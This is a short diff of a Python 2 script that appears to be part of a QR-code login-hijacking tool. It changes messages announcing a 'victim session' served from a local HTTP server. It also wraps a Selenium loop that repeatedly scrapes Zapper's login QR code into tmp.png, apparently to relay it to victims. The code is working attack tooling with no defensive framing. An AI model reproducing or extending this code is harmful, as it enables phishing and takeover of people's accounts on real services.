@@ -35,10 +35,10 @@ def Serve_it(port=1337):
 	def serve(port):
 		if os.name=="nt":
 			try:
-				print " [*]  on http://localhost:"+str(port)
+				print " [*] Starting victim session on http://localhost:"+str(port)
 				os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
 			except:
-				print " [*]  on http://localhost:"+str(port)
+				print " [*] Starting victim session on http://localhost:"+str(port)
 				os.system(str(sys.executable)+" -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
 		else:
 			print " [*] Starting victim session on http://localhost:"+str(port)
@@ -313,14 +313,15 @@ def Zapper():
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
 	while True:
-		img = driver.find_elements_by_tag_name("img")[3]
-		print " [*] QR code image detected !"
-		src = img.get_attribute('src')
-		print " [*] Downloading the image.."
-		qr = urllib.urlretrieve(src, "tmp.png")
-		print " [*] Saved To tmp.png"
-		time.sleep(20)
-		if "Login" not in driver.title.encode("utf-8"):
+		try:
+			img = driver.find_elements_by_tag_name("img")[3]
+			print " [*] QR code image detected !"
+			src = img.get_attribute('src')
+			print " [*] Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [*] Saved To tmp.png"
+			time.sleep(20)
+		except:
 			break
 
 def Trustly_App():
